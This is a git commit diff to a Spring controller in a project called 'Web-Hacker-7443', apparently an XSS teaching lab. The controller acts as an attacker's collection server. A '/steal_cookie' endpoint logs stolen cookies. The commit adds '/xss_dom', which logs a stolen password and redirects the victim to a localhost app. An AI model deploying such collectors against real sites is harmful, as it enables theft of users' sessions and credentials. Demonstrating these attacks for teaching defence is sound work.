cd7bbfcd520d326f937584d072e8c433c2866991
vincenttuan <vincentjava@yahoo.com.tw>
2023-02-26 19:28:07 +0800

    spa

--- Web-Hacker-7443/src/main/java/com/example/demo/controller/HackerController.java
+++ Web-Hacker-7443/src/main/java/com/example/demo/controller/HackerController.java
@@ -5,18 +5,28 @@ import java.io.IOException;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 
+import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.bind.annotation.RestController;
 
-@RestController
+@Controller
 public class HackerController {
 	
 	@RequestMapping("/steal_cookie")
+	@ResponseBody
 	public String stealCookie(HttpServletRequest request, HttpServletResponse response) {
 		response.addHeader("Access-Control-Allow-Origin", "*"); 
 		System.out.println("Hacker 偷取 cookie: " + request.getParameter("data"));
 		return "";
 	}
 	
+	@RequestMapping("/xss_dom")
+	public String xssDom(HttpServletRequest request, HttpServletResponse response) {
+		String password = request.getParameter("password");
+		System.out.println("竊取 password : " +password);
+		
+		return "redirect:https://localhost:9443/mango/input?myName=Mary";
+	}
 	
 }
